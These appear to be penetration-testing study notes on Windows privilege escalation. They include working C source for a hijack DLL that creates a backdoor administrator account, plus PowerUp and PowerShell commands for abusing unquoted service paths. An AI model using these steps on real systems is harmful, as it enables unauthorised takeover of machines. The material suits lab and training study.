
**Scheduled Tasks**
`schtasks /query /fo LIST /v`

**Check privs**
```
- SeImpersonatePrivilege
- SeAssignPrimaryToken
- SeLoader
- SeDebug
```

**Named Pipes**

If SeImpersonate is running on Windows11
https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html

Try EFSPotato and other Potatoes if necessary

**DLL Hijacking**
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls .\Path\Service.exe
	Check for F permissions
```

If we have admin privs
```
	1. Can also use *Process Monitor* which requires admin privs / *procmon64.exe*
	2. Filter down with filter > process name is "*process name*"
	3. Restart service
	4. Eventually we find a operation that performs *CreateFile* for a DLL in a C:\USers directory. NAme not found.
```

To create a new DLL
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

- x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
- Restart-Service BetaService
```

**Unquoted Service Paths**
Note: Try this manually and with power up to find all actual positive hits
```
- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
- Looking for something like:
	- C:\Program.exe
	- C:\Program Files\My.exe
	- C:\Program Files\My Program\My.exe
	- C:\Program Files\My Program\My service\service.exe
- Then go down the list wiht icacls and make sure you can (RX,W) to it
- e.g `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`
	- We can put current.exe in the enterprise apps folder
	- Then Start-Service GammaService
- If there's an error it should still launc

With PowerUp:
- powershell -ep bypass
- . .\PowerUp.ps1
- Get-UnquotedService
- Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
- Restart-Service GammaService
```